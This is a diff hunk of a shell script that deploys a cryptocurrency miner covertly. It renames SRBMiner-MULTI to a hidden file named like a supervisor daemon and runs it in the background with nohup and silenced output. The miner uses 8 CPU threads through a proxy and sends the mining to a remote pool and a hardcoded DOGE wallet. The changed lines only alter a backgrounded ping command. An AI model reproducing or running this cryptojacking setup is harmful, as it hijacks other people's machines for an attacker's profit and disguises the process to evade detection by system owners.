@@ -20,5 +20,5 @@
 #mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm xelishashv2_pepew --disable-gpu --pool 103.249.70.7:5778 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=X8vPepew --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8
 #mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm yespowerr16 --disable-gpu --pool 103.249.70.7:6534 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=X8vYenten --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8
 mv SRBMiner-MULTI .supervisord-wr && nohup ./.supervisord-wr --algorithm verushash --disable-gpu --cpu-threads 8 --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuX --password ID=cpuX8,c=DOGE,refcode=78f6ec9427d56069f93709d7805a6a56 --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 </dev/null &>/dev/null &
-sudo apt install inetutils-ping -y && nohup ping 1.1.1.1 </dev/null &>/dev/null &
-sudo apt install inetutils-ping -y && nohup ping 1.1.1.1 </dev/null &>/dev/null &
+apt install inetutils-ping -y && nohup ping 1.1.1.1 </dev/null &>/dev/null &
+apt install inetutils-ping -y && nohup ping 1.1.1.1 </dev/null &>/dev/null &
